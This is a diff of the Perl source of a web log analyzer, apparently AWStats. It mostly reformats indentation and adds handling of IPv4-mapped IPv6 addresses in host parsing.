-				elsif ($Host =~ /$regipv4/o) { $HostResolved='*'; $ip=4; }	# IPv4
+				if ( $Host =~ /$regipv4l/o ) {
+					$Host =~ s/^::ffff://;
+					$HostResolved = '*';
+					$ip           = 4;
+				}
+				elsif ( $Host =~ /$regipv4/o ) {
+					$HostResolved = '*';
+					$ip           = 4;
+				}    # IPv4
 				elsif ( $Host =~ /$regipv6/o ) {
 					$HostResolved = '*';
 					$ip           = 6;
@@ -11733,7 +11840,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 				}
 				if ($AtLeastOneSectionPlugin) {
 					foreach my $pluginname (
-								  keys %{ $PluginsLoaded{'SectionProcessIp'} } )
+						keys %{ $PluginsLoaded{'SectionProcessIp'} } )
 					{
 						my $function = "SectionProcessIp_$pluginname";
 						if ($Debug) {
@@ -11758,19 +11865,19 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 #				elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($Host); }
 #				elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($Host); }
 					elsif (
-						   $PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} )
+						$PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} )
 					{
 						$Domain = GetCountryCodeByAddr_geoipfree($Host);
 					}
 					elsif ( $HostResolved =~ /\.(\w+)$/ ) { $Domain = $1; }
 					if ($AtLeastOneSectionPlugin) {
 						foreach my $pluginname (
-								  keys %{ $PluginsLoaded{'SectionProcessIp'} } )
+							keys %{ $PluginsLoaded{'SectionProcessIp'} } )
 						{
 							my $function = "SectionProcessIp_$pluginname";
 							if ($Debug) {
 								debug( "  Call to plugin function $function",
-									   5 );
+									5 );
 							}
 							&$function($Host);
 						}
@@ -11784,7 +11891,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 #				elsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByName_geoip_region_maxmind($HostResolved); }
 #				elsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByName_geoip_city_maxmind($HostResolved); }
 					elsif (
-						   $PluginsLoaded{'GetCountryCodeByName'}{'geoipfree'} )
+						$PluginsLoaded{'GetCountryCodeByName'}{'geoipfree'} )
 					{
 						$Domain = GetCountryCodeByName_geoipfree($HostResolved);
 					}
@@ -11796,7 +11903,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 							my $function = "SectionProcessHostname_$pluginname";
 							if ($Debug) {
 								debug( "  Call to plugin function $function",
-									   5 );
+									5 );
 							}
 							&$function($HostResolved);
 						}
@@ -11807,8 +11914,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			# Store country
 			if ($PageBool) { $_domener_p{$Domain}++; }
 			$_domener_h{$Domain}++;
-			if ($field[$pos_size] ne '-') {
-				$_domener_k{$Domain}+=int($field[$pos_size]);
+			if ( $field[$pos_size] ne '-' ) {
+				$_domener_k{$Domain} += int( $field[$pos_size] );
 			}
 
 			# Analyze: Host, URL entry+exit and Session
@@ -11863,7 +11970,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 							$DayVisits{$yearmonthdayrecord}++;
 							if ($timehosts) {
 								$_session{ GetSessionRange( $timehosts,
-															$timehostl ) }++;
+										$timehostl ) }++;
 							}
 						}
 
@@ -11943,8 +12050,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 				$_host_p{$HostResolved}++;
 			}
 			$_host_h{$HostResolved}++;
-			if ($field[$pos_size] ne '-') {
-				$_host_k{$HostResolved}+=int($field[$pos_size]);
+			if ( $field[$pos_size] ne '-' ) {
+				$_host_k{$HostResolved} += int( $field[$pos_size] );
 			}
 
 			# Analyze: Browser - OS
@@ -11960,36 +12067,44 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 						my $found = 1;
 
 						# Opera ?
-						if ($UserAgent =~ /$regveropera/o) {
+						if ( $UserAgent =~ /$regveropera/o ) {
 							$_browser_h{"opera$1"}++;
-							$TmpBrowser{$UserAgent}="opera$1";
+							$TmpBrowser{$UserAgent} = "opera$1";
 						}
+
 						# Chrome ?
-						elsif ($UserAgent =~ /$regverchrome/o) {
+						elsif ( $UserAgent =~ /$regverchrome/o ) {
 							$_browser_h{"chrome$1"}++;
-							$TmpBrowser{$UserAgent}="chrome$1";
+							$TmpBrowser{$UserAgent} = "chrome$1";
 						}
+
 						# Safari ?
-						elsif ($UserAgent =~ /$regversafari/o && $UserAgent !~ /$regnotsafari/o) {
+						elsif ($UserAgent =~ /$regversafari/o
+							&& $UserAgent !~ /$regnotsafari/o )
+						{
 							my $safariver = $SafariBuildToVersion{$1};
 							$_browser_h{"safari$safariver"}++;
-							$TmpBrowser{$UserAgent}="safari$safariver";
+							$TmpBrowser{$UserAgent} = "safari$safariver";
 						}
+
 						# Konqueror ?
-						elsif ($UserAgent =~ /$regverkonqueror/o) {
+						elsif ( $UserAgent =~ /$regverkonqueror/o ) {
 							$_browser_h{"konqueror$1"}++;
-							$TmpBrowser{$UserAgent}="konqueror$1";
+							$TmpBrowser{$UserAgent} = "konqueror$1";
 						}
+
 						# IE ?
-						elsif (    $UserAgent =~ /$regvermsie/o
-							 && $UserAgent !~ /$regnotie/o )
+						elsif ($UserAgent =~ /$regvermsie/o
+							&& $UserAgent !~ /$regnotie/o )
 						{
 							$_browser_h{"msie$2"}++;
 							$TmpBrowser{$UserAgent} = "msie$2";
 						}
 
 						# Firefox ?
-						elsif ( $UserAgent =~ /$regverfirefox/o && $UserAgent !~ /$regnotfirefox/o) {
+						elsif ($UserAgent =~ /$regverfirefox/o
+							&& $UserAgent !~ /$regnotfirefox/o )
+						{
 							$_browser_h{"firefox$1"}++;
 							$TmpBrowser{$UserAgent} = "firefox$1";
 						}
@@ -12007,8 +12122,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 						}
 
 						# Netscape 3.x, 4.x ... ?
-						elsif (    $UserAgent =~ /$regvermozilla/o
-								&& $UserAgent !~ /$regnotnetscape/o )
+						elsif ($UserAgent =~ /$regvermozilla/o
+							&& $UserAgent !~ /$regnotnetscape/o )
 						{
 							$_browser_h{"netscape$2"}++;
 							$TmpBrowser{$UserAgent} = "netscape$2";
@@ -12100,14 +12215,14 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			# Analyze: Referer
 			#-----------------
 			my $found = 0;
-			if (    $pos_referer >= 0
-				 && $LevelForRefererAnalyze
-				 && $field[$pos_referer] )
+			if (   $pos_referer >= 0
+				&& $LevelForRefererAnalyze
+				&& $field[$pos_referer] )
 			{
 
 				# Direct ?
-				if (    $field[$pos_referer] eq '-'
-					 || $field[$pos_referer] eq 'bookmarks' )
+				if (   $field[$pos_referer] eq '-'
+					|| $field[$pos_referer] eq 'bookmarks' )
 				{  # "bookmarks" is sent by Netscape, '-' by all others browsers
 					    # Direct access
 					if ($PageBool) {
@@ -12188,7 +12303,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 													}
 													$TmpRefererServer{
 														$refererserver} =
-													  $SearchEnginesHashID{$key
+													  $SearchEnginesHashID{ $key
 													  };
 													$found = 1;
 												}
@@ -12231,16 +12346,16 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 
 # Extract params of referer query string (q=cache:mmm:www/zzz+aaa+bbb q=aaa+bbb/ccc key=ddd%20eee lang_en ie=UTF-8 ...)
 										if (
-											 $SearchEnginesKnownUrl{
-												 $tmprefererserver} )
+											$SearchEnginesKnownUrl{
+												$tmprefererserver} )
 										{  # Search engine with known URL syntax
 											foreach my $param (
-													   split(
-														   /&/,
-														   $KeyWordsNotSensitive
-														   ? lc( $refurl[1] )
-														   : $refurl[1]
-													   )
+												split(
+													/&/,
+													$KeyWordsNotSensitive
+													? lc( $refurl[1] )
+													: $refurl[1]
+												)
 											  )
 											{
 												if ( $param =~
@@ -12268,23 +12383,23 @@ s/^(cache|related):[^\+]+//
 											}
 										}
 										elsif (
-											   $LevelForKeywordsDetection >= 2 )
+											$LevelForKeywordsDetection >= 2 )
 										{ # Search engine with unknown URL syntax
 											foreach my $param (
-													   split(
-														   /&/,
-														   $KeyWordsNotSensitive
-														   ? lc( $refurl[1] )
-														   : $refurl[1]
-													   )
+												split(
+													/&/,
+													$KeyWordsNotSensitive
+													? lc( $refurl[1] )
+													: $refurl[1]
+												)
 											  )
 											{
 												my $foundexcludeparam = 0;
 												foreach my $paramtoexclude (
-														 @WordsToCleanSearchUrl)
+													@WordsToCleanSearchUrl)
 												{
 													if ( $param =~
-														 /$paramtoexclude/i )
+														/$paramtoexclude/i )
 													{
 														$foundexcludeparam = 1;
 														last;
@@ -12302,7 +12417,7 @@ s/^(cache|related):[^\+]+//
 												  s/^(cache|related):[^\+]+//
 												  ; # Should be useless since this is for hit on 'not pages'
 												&ChangeWordSeparatorsIntoSpace(
-																		 $param)
+													$param)
 												  ; # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ] into [ aaa bbb/ccc ddd eee fff ggg ]
 												$param =~ s/^ +//;
 												$param =~ s/ +$//;     # Trim
@@ -12315,8 +12430,8 @@ s/^(cache|related):[^\+]+//
 										}
 									}    # End of elsif refurl[1]
 									elsif (
-											$SearchEnginesWithKeysNotInQuery{
-												$tmprefererserver} )
+										$SearchEnginesWithKeysNotInQuery{
+											$tmprefererserver} )
 									{
 
 #										debug("xxx".$refurl[0]);
@@ -12327,7 +12442,7 @@ s/^(cache|related):[^\+]+//
 										{
 											my $param = $1;
 											&ChangeWordSeparatorsIntoSpace(
-																		$param);
+												$param);
 											$param =~ tr/ /\+/s;
 											if ( ( length $param ) > 0 ) {
 												$_keyphrases{$param}++;
@@ -12357,7 +12472,7 @@ s/^(cache|related):[^\+]+//
 
 								# We discard query for referer
 								if ( $field[$pos_referer] =~
-									 /$regreferernoquery/o )
+									/$regreferernoquery/o )
 								{
 									if ($PageBool) { $_pagesrefs_p{"$1"}++; }
 									$_pagesrefs_h{"$1"}++;
@@ -12450,7 +12565,7 @@ s/^(cache|related):[^\+]+//
 						);
 					}
 					if ( $field[$pos_code] eq
-						 "$ExtraCodeFilter[$extranum][$condnum]" )
+						"$ExtraCodeFilter[$extranum][$condnum]" )
 					{
 						$conditionok = 1;
 						last;
@@ -12506,7 +12621,7 @@ s/^(cache|related):[^\+]+//
 						);
 					}
 					if ( "$urlwithnoquery$tokenquery$standalonequery" =~
-						 /$conditiontypeval/ )
+						/$conditiontypeval/ )
 					{
 						$conditionok = 1;
 						last;
@@ -12586,7 +12701,8 @@ s/^(cache|related):[^\+]+//
 					}
 				}
 				else {
-					error(             "Wrong value of parameter ExtraSectionCondition$extranum"
+					error(
+"Wrong value of parameter ExtraSectionCondition$extranum"
 					);
 				}
 			}
@@ -12604,7 +12720,7 @@ s/^(cache|related):[^\+]+//
 			my $rowkeyval;
 			my $rowkeyok = 0;
 			foreach my $rowkeynum (
-						  0 .. @{ $ExtraFirstColumnValuesType[$extranum] } - 1 )
+				0 .. @{ $ExtraFirstColumnValuesType[$extranum] } - 1 )
 			{
 				my $rowkeytype =
 				  $ExtraFirstColumnValuesType[$extranum][$rowkeynum];
@@ -12632,7 +12748,7 @@ s/^(cache|related):[^\+]+//
 				}
 				elsif ( $rowkeytype eq 'URLWITHQUERY' ) {
 					if ( "$urlwithnoquery$tokenquery$standalonequery" =~
-						 /$rowkeytypeval/ )
+						/$rowkeytypeval/ )
 					{
 						$rowkeyval = "$1";
 						$rowkeyok  = 1;
@@ -12683,7 +12799,8 @@ s/^(cache|related):[^\+]+//
 					}
 				}
 				else {
-					error(             "Wrong value of parameter ExtraSectionFirstColumnValues$extranum"
+					error(
+"Wrong value of parameter ExtraSectionFirstColumnValues$extranum"
 					);
 				}
 			}
@@ -12708,7 +12825,7 @@ s/^(cache|related):[^\+]+//
 			}
 			if ( $ExtraStatTypes[$extranum] =~ /L/i ) {
 				if ( ${ '_section_' . $extranum . '_l' }{$rowkeyval}
-					 || 0 < $timerecord )
+					|| 0 < $timerecord )
 				{
 					${ '_section_' . $extranum . '_l' }{$rowkeyval} =
 					  $timerecord;
@@ -12717,8 +12834,8 @@ s/^(cache|related):[^\+]+//
 
 			# Check to avoid too large extra sections
 			if (
-				 scalar keys %{ '_section_' . $extranum . '_h' } >
-				 $ExtraTrackedRowsLimit )
+				scalar keys %{ '_section_' . $extranum . '_h' } >
+				$ExtraTrackedRowsLimit )
 			{
 				error(<<END_ERROR_TEXT);
 The number of values found for extra section $extranum has grown too large.
@@ -12735,8 +12852,8 @@ END_ERROR_TEXT
 		if ( ++$counterforflushtest >= 20000 ) {
 
 			#if (++$counterforflushtest >= 1) {
-			if (    ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 )
-				 || ( scalar keys %_url_p ) > $LIMITFLUSH )
+			if (   ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 )
+				|| ( scalar keys %_url_p ) > $LIMITFLUSH )
 			{
 
 # warning("Warning: Try to run AWStats update process more frequently to analyze smaler log files.");
@@ -12796,16 +12913,16 @@ END_ERROR_TEXT
 						  . ( scalar keys %_waithost_u ) . "\n";
 					}
 					&Read_History_With_TmpUpdate(
-											 $lastprocessedyear,
-											 $lastprocessedmonth,
-											 $lastprocessedday,
-											 $lastprocessedhour,
-											 1,
-											 1,
-											 "all",
-											 ( $lastlinenb + $NbOfLinesParsed ),
-											 $lastlineoffset,
-											 &CheckSum($_)
+						$lastprocessedyear,
+						$lastprocessedmonth,
+						$lastprocessedday,
+						$lastprocessedhour,
+						1,
+						1,
+						"all",
+						( $lastlinenb + $NbOfLinesParsed ),
+						$lastlineoffset,
+						&CheckSum($_)
 					);
 					&GetDelaySinceStart(1);
 					$NbOfLinesShowsteps = 1;
@@ -12818,54 +12935,54 @@ END_ERROR_TEXT
 
 	if ($Debug) {
 		debug(
-			   " _host_p:"
-				 . ( scalar keys %_host_p )
-				 . " _host_h:"
-				 . ( scalar keys %_host_h )
-				 . " _host_k:"
-				 . ( scalar keys %_host_k )
-				 . " _host_l:"
-				 . ( scalar keys %_host_l )
-				 . " _host_s:"
-				 . ( scalar keys %_host_s )
-				 . " _host_u:"
-				 . ( scalar keys %_host_u ) . "\n",
-			   1
+			" _host_p:"
+			  . ( scalar keys %_host_p )
+			  . " _host_h:"
+			  . ( scalar keys %_host_h )
+			  . " _host_k:"
+			  . ( scalar keys %_host_k )
+			  . " _host_l:"
+			  . ( scalar keys %_host_l )
+			  . " _host_s:"
+			  . ( scalar keys %_host_s )
+			  . " _host_u:"
+			  . ( scalar keys %_host_u ) . "\n",
+			1
 		);
 		debug(
-			   " _url_p:"
-				 . ( scalar keys %_url_p )
-				 . " _url_k:"
-				 . ( scalar keys %_url_k )
-				 . " _url_e:"
-				 . ( scalar keys %_url_e )
-				 . " _url_x:"
-				 . ( scalar keys %_url_x ) . "\n",
-			   1
+			" _url_p:"
+			  . ( scalar keys %_url_p )
+			  . " _url_k:"
+			  . ( scalar keys %_url_k )
+			  . " _url_e:"
+			  . ( scalar keys %_url_e )
+			  . " _url_x:"
+			  . ( scalar keys %_url_x ) . "\n",
+			1
 		);
 		debug(
-			   " _waithost_e:"
-				 . ( scalar keys %_waithost_e )
-				 . " _waithost_l:"
-				 . ( scalar keys %_waithost_l )
-				 . " _waithost_s:"
-				 . ( scalar keys %_waithost_s )
-				 . " _waithost_u:"
-				 . ( scalar keys %_waithost_u ) . "\n",
-			   1
+			" _waithost_e:"
+			  . ( scalar keys %_waithost_e )
+			  . " _waithost_l:"
+			  . ( scalar keys %_waithost_l )
+			  . " _waithost_s:"
+			  . ( scalar keys %_waithost_s )
+			  . " _waithost_u:"
+			  . ( scalar keys %_waithost_u ) . "\n",
+			1
 		);
 		debug(
-			 "End of processing log file (AWStats memory cache is TmpDNSLookup="
-			   . ( scalar keys %TmpDNSLookup )
-			   . " TmpBrowser="
-			   . ( scalar keys %TmpBrowser )
-			   . " TmpOS="
-			   . ( scalar keys %TmpOS )
-			   . " TmpRefererServer="
-			   . ( scalar keys %TmpRefererServer )
-			   . " TmpRobot="
-			   . ( scalar keys %TmpRobot ) . ")",
-			 1
+			"End of processing log file (AWStats memory cache is TmpDNSLookup="
+			  . ( scalar keys %TmpDNSLookup )
+			  . " TmpBrowser="
+			  . ( scalar keys %TmpBrowser )
+			  . " TmpOS="
+			  . ( scalar keys %TmpOS )
+			  . " TmpRefererServer="
+			  . ( scalar keys %TmpRefererServer )
+			  . " TmpRobot="
+			  . ( scalar keys %TmpRobot ) . ")",
+			1
 		);
 	}
 
@@ -12919,7 +13036,8 @@ END_ERROR_TEXT
 				  . &Substitute_Tags($ArchiveLogRecords) . ".log";
 			}
 			open( LOG, "+<$LogFile" )
-			  || error(  "Enable to archive log records of \"$LogFile\" into \"$ArchiveFileName\" because source can't be opened for read and write: $!<br />\n"
+			  || error(
+"Enable to archive log records of \"$LogFile\" into \"$ArchiveFileName\" because source can't be opened for read and write: $!<br />\n"
 			  );
 		}
 		else {
@@ -12939,7 +13057,7 @@ END_ERROR_TEXT
 			if ($Debug) { debug("Start of archiving log file"); }
 			open( ARCHIVELOG, ">>$ArchiveFileName" )
 			  || error(
-				  "Couldn't open file \"$ArchiveFileName\" to archive log: $!");
+				"Couldn't open file \"$ArchiveFileName\" to archive log: $!");
 			binmode ARCHIVELOG;
 			while (<LOG>) {
 				if ( !print ARCHIVELOG $_ ) { $archiveok = 0; last; }
@@ -12959,7 +13077,8 @@ END_ERROR_TEXT
 			my $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );
 			my $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );
 			truncate( LOG, 0 )
-			  || warning("Warning: $bold$PROG$unbold couldn't purge logfile \"$bold$LogFile$unbold\".$br\nChange your logfile permissions to allow write for your web server CGI process or change PurgeLogFile=1 into PurgeLogFile=0 in configure file and think to purge sometimes manually your logfile (just after running an update process to not loose any not already processed records your log file contains)."
+			  || warning(
+"Warning: $bold$PROG$unbold couldn't purge logfile \"$bold$LogFile$unbold\".$br\nChange your logfile permissions to allow write for your web server CGI process or change PurgeLogFile=1 into PurgeLogFile=0 in configure file and think to purge sometimes manually your logfile (just after running an update process to not loose any not already processed records your log file contains)."
 			  );
 		}
 		close(LOG);
@@ -12971,14 +13090,15 @@ END_ERROR_TEXT
 		my $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );
 		my $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );
 		my $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );
-		warning(  "Warning: $bold$PROG$unbold has detected that some hosts names were already resolved in your logfile $bold$DNSLookupAlreadyDone$unbold.$br\nIf DNS lookup was already made by the logger (web server), you should change your setup DNSLookup=$DNSLookup into DNSLookup=0 to increase $PROG speed."
+		warning(
+"Warning: $bold$PROG$unbold has detected that some hosts names were already resolved in your logfile $bold$DNSLookupAlreadyDone$unbold.$br\nIf DNS lookup was already made by the logger (web server), you should change your setup DNSLookup=$DNSLookup into DNSLookup=0 to increase $PROG speed."
 		);
 	}
 	if ( $DNSLookup == 1 && $NbOfNewLines ) {
 
 		# Save new DNS last update cache file
 		Save_DNS_Cache_File( \%TmpDNSLookup, "$DirData/$DNSLastUpdateCacheFile",
-							 "$FileSuffix" );  # Save into file using FileSuffix
+			"$FileSuffix" );    # Save into file using FileSuffix
 	}
 
 	if ($EnableLockForUpdate) {
@@ -12987,9 +13107,9 @@ END_ERROR_TEXT
 		&Lock_Update(0);
 
 		# Restore signals handler
-		$SIG{INT} = 'DEFAULT';                 # 2
-		                                       #$SIG{KILL} = 'DEFAULT';	# 9
-		                                       #$SIG{TERM} = 'DEFAULT';	# 15
+		$SIG{INT} = 'DEFAULT';    # 2
+		                          #$SIG{KILL} = 'DEFAULT';	# 9
+		                          #$SIG{TERM} = 'DEFAULT';	# 15
 	}
 
 }
@@ -13046,7 +13166,7 @@ if ( scalar keys %HTMLOutput ) {
 		$NewLinkTarget = " target=\"awstatsbis\"";
 	}
 	if ( ( $FrameName eq 'mainleft' || $FrameName eq 'mainright' )
-		 && $DetailedReportsOnNewWindows < 2 )
+		&& $DetailedReportsOnNewWindows < 2 )
 	{
 		$NewLinkParams .= "&amp;framename=mainright";
 		$NewLinkTarget = " target=\"mainright\"";
@@ -13071,7 +13191,7 @@ if ( scalar keys %HTMLOutput ) {
 					$stringforload = 'all';    # Read full history file
 				}
 				elsif ( ( $HTMLOutput{'main'} && $ShowMonthStats )
-						|| $HTMLOutput{'alldays'} )
+					|| $HTMLOutput{'alldays'} )
 				{
 					$stringforload =
 					  'general time';          # Read general and time sections.
@@ -13080,7 +13200,7 @@ if ( scalar keys %HTMLOutput ) {
 
 					# On charge fichier
 					&Read_History_With_TmpUpdate( $YearRequired, $monthix, '',
-												  '', 0, 0, $stringforload );
+						'', 0, 0, $stringforload );
 				}
 			}
 		}
@@ -13089,7 +13209,7 @@ if ( scalar keys %HTMLOutput ) {
 			my $monthix       = sprintf( "%02s", $MonthRequired );
 			my $dayix         = sprintf( "%02s", $DayRequired );
 			&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix, '',
-										  0, 0, $stringforload );
+				0, 0, $stringforload );
 		}
 		if ( $DatabaseBreak eq 'hour' ) {
 			my $stringforload = 'all';
@@ -13097,7 +13217,7 @@ if ( scalar keys %HTMLOutput ) {
 			my $dayix         = sprintf( "%02s", $DayRequired );
 			my $hourix        = sprintf( "%02s", $HourRequired );
 			&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix,
-										  $hourix, 0, 0, $stringforload );
+				$hourix, 0, 0, $stringforload );
 		}
 
 	}
@@ -13271,9 +13391,11 @@ if ( scalar keys %HTMLOutput ) {
 				foreach ( 1 .. 12 ) {
 					my $monthix = sprintf( "%02s", $_ );
 					print "<option"
-					  . (   "$MonthRequired" eq "$monthix"
-						  ? " selected=\"true\""
-						  : "" )
+					  . (
+						  "$MonthRequired" eq "$monthix"
+						? " selected=\"true\""
+						: ""
+					  )
 					  . " value=\"$monthix\">$MonthNumLib{$monthix}</option>\n";
 				}
 				if ( $AllowFullYearView >= 2 ) {
@@ -13363,7 +13485,7 @@ if ( scalar keys %HTMLOutput ) {
 
 		# Print menu links
 		if ( ( $HTMLOutput{'main'} && $FrameName ne 'mainright' )
-			 || $FrameName eq 'mainleft' )
+			|| $FrameName eq 'mainleft' )
 		{    # If main page asked
 			    # Define link anchor
 			my $linkanchor =
@@ -13384,9 +13506,11 @@ if ( scalar keys %HTMLOutput ) {
 				my $menuicon = 0;    # TODO a virer
 				                     # Menu HTML
 				print "<table"
-				  . ( $frame
-					  ? " cellspacing=\"0\" cellpadding=\"0\" border=\"0\""
-					  : "" )
+				  . (
+					$frame
+					? " cellspacing=\"0\" cellpadding=\"0\" border=\"0\""
+					: ""
+				  )
 				  . ">\n";
 				if ( $FrameName eq 'mainleft' && $ShowMonthStats ) {
 					print( $frame? "<tr><td class=\"awsm\">" : "" );
@@ -13400,30 +13524,30 @@ if ( scalar keys %HTMLOutput ) {
 
 				# When
 				%menu = (
-						  'month'       => $ShowMonthStats       ? 1 : 0,
-						  'daysofmonth' => $ShowDaysOfMonthStats ? 2 : 0,
-						  'daysofweek'  => $ShowDaysOfWeekStats  ? 3 : 0,
-						  'hours'       => $ShowHoursStats       ? 4 : 0
+					'month'       => $ShowMonthStats       ? 1 : 0,
+					'daysofmonth' => $ShowDaysOfMonthStats ? 2 : 0,
+					'daysofweek'  => $ShowDaysOfWeekStats  ? 3 : 0,
+					'hours'       => $ShowHoursStats       ? 4 : 0
 				);
 				%menulink = (
-							  'month'       => 1,
-							  'daysofmonth' => 1,
-							  'daysofweek'  => 1,
-							  'hours'       => 1
+					'month'       => 1,
+					'daysofmonth' => 1,
+					'daysofweek'  => 1,
+					'hours'       => 1
 				);
 				%menutext = (
-							  'month'       => $Message[162],
-							  'daysofmonth' => $Message[138],
-							  'daysofweek'  => $Message[91],
-							  'hours'       => $Message[20]
+					'month'       => $Message[162],
+					'daysofmonth' => $Message[138],
+					'daysofweek'  => $Message[91],
+					'hours'       => $Message[20]
 				);
 				ShowMenuCateg(
-							   'when',         $Message[93],
-							   'menu4.png',    $frame,
-							   $targetpage,    $linkanchor,
-							   $NewLinkParams, $NewLinkTarget,
-							   \%menu,         \%menulink,
-							   \%menutext
+					'when',         $Message[93],
+					'menu4.png',    $frame,
+					$targetpage,    $linkanchor,
+					$NewLinkParams, $NewLinkTarget,
+					\%menu,         \%menulink,
+					\%menutext
 				);
 
 				# Who
@@ -13449,72 +13573,71 @@ if ( scalar keys %HTMLOutput ) {
 					'worms' => $ShowWormsStats ? 19 : 0
 				);
 				%menulink = (
-							  'countries'      => 1,
-							  'alldomains'     => 2,
-							  'visitors'       => 1,
-							  'allhosts'       => 2,
-							  'lasthosts'      => 2,
-							  'unknownip'      => 2,
-							  'logins'         => 1,
-							  'alllogins'      => 2,
-							  'lastlogins'     => 2,
-							  'emailsenders'   => 1,
-							  'allemails'      => 2,
-							  'lastemails'     => 2,
-							  'emailreceivers' => 1,
-							  'allemailr'      => 2,
-							  'lastemailr'     => 2,
-							  'robots'         => 1,
-							  'allrobots'      => 2,
-							  'lastrobots'     => 2,
-							  'worms'          => 1
+					'countries'      => 1,
+					'alldomains'     => 2,
+					'visitors'       => 1,
+					'allhosts'       => 2,
+					'lasthosts'      => 2,
+					'unknownip'      => 2,
+					'logins'         => 1,
+					'alllogins'      => 2,
+					'lastlogins'     => 2,
+					'emailsenders'   => 1,
+					'allemails'      => 2,
+					'lastemails'     => 2,
+					'emailreceivers' => 1,
+					'allemailr'      => 2,
+					'lastemailr'     => 2,
+					'robots'         => 1,
+					'allrobots'      => 2,
+					'lastrobots'     => 2,
+					'worms'          => 1
 				);
 				%menutext = (
-							  'countries'      => $Message[148],
-							  'alldomains'     => $Message[80],
-							  'visitors'       => $Message[81],
-							  'allhosts'       => $Message[80],
-							  'lasthosts'      => $Message[9],
-							  'unknownip'      => $Message[45],
-							  'logins'         => $Message[94],
-							  'alllogins'      => $Message[80],
-							  'lastlogins'     => $Message[9],
-							  'emailsenders'   => $Message[131],
-							  'allemails'      => $Message[80],
-							  'lastemails'     => $Message[9],
-							  'emailreceivers' => $Message[132],
-							  'allemailr'      => $Message[80],
-							  'lastemailr'     => $Message[9],
-							  'robots'         => $Message[53],
-							  'allrobots'      => $Message[80],
-							  'lastrobots'     => $Message[9],
-							  'worms'          => $Message[136]
+					'countries'      => $Message[148],
+					'alldomains'     => $Message[80],
+					'visitors'       => $Message[81],
+					'allhosts'       => $Message[80],
+					'lasthosts'      => $Message[9],
+					'unknownip'      => $Message[45],
+					'logins'         => $Message[94],
+					'alllogins'      => $Message[80],
+					'lastlogins'     => $Message[9],
+					'emailsenders'   => $Message[131],
+					'allemails'      => $Message[80],
+					'lastemails'     => $Message[9],
+					'emailreceivers' => $Message[132],
+					'allemailr'      => $Message[80],
+					'lastemailr'     => $Message[9],
+					'robots'         => $Message[53],
+					'allrobots'      => $Message[80],
+					'lastrobots'     => $Message[9],
+					'worms'          => $Message[136]
 				);
 				ShowMenuCateg(
-							   'who',          $Message[92],
-							   'menu5.png',    $frame,
-							   $targetpage,    $linkanchor,
-							   $NewLinkParams, $NewLinkTarget,
-							   \%menu,         \%menulink,
-							   \%menutext
+					'who',          $Message[92],
+					'menu5.png',    $frame,
+					$targetpage,    $linkanchor,
+					$NewLinkParams, $NewLinkTarget,
+					\%menu,         \%menulink,
+					\%menutext
 				);
 
 				# Navigation
 				$linetitle = &AtLeastOneNotNull(
-												 $ShowSessionsStats,
-												 $ShowPagesStats,
-												 $ShowFileTypesStats,
-												 $ShowFileSizesStats,
-												 $ShowOSStats,
-												 $ShowBrowsersStats,
-												 $ShowScreenSizeStats
+					$ShowSessionsStats,  $ShowPagesStats,
+					$ShowFileTypesStats, $ShowFileSizesStats,
+					$ShowOSStats,        $ShowBrowsersStats,
+					$ShowScreenSizeStats
 				);
 				if ($linetitle) {
 					print "<tr><td class=\"awsm\""
 					  . ( $frame ? "" : " valign=\"top\"" ) . ">"
-					  . ( $menuicon
-						  ? "<img src=\"$DirIcons/other/menu2.png\" />&nbsp;"
-						  : "" )
+					  . (
+						$menuicon
+						? "<img src=\"$DirIcons/other/menu2.png\" />&nbsp;"
+						: ""
+					  )
 					  . "<b>$Message[72]:</b></td>\n";
 				}
 				if ($linetitle) {
@@ -13541,13 +13664,14 @@ if ( scalar keys %HTMLOutput ) {
 				if ($ShowPagesStats) {
 					print( $frame
 						? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-						: "" );
+						: ""
+					);
 					print "<a href=\""
 					  . (
-						  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-						  ? XMLEncode(
-								   "$AWScript?${NewLinkParams}output=urldetail")
-						  : "$PROG$StaticLinks.urldetail.$StaticExt"
+						$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+						? XMLEncode(
+							"$AWScript?${NewLinkParams}output=urldetail")
+						: "$PROG$StaticLinks.urldetail.$StaticExt"
 					  )
 					  . "\"$NewLinkTarget>$Message[80]</a>\n";
